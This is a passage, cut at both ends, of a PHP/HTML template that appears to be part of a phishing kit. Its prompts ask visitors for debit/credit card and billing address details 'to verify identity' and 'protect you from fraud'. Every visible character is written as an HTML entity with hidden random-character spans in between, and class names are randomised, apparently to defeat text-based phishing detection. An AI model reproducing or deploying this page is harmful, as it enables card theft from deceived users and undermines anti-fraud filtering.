substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&period;</h3>
                                        </div>
                                        <div style="display:none;" id="cardotext" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;&period;</h3>
                                            <br>
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&colon;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;&period;</h3>
                                        </div>
										<div style="display:none;" id="billingotext" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;&period;</h3>
                                            <br>
                                            <h3 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> u-focus in-progress" tabindex="-1" style="font-size: 18px; color: #dab70d;"><img src="./img/alert.gif" style="width: 17px;" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&colon;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span 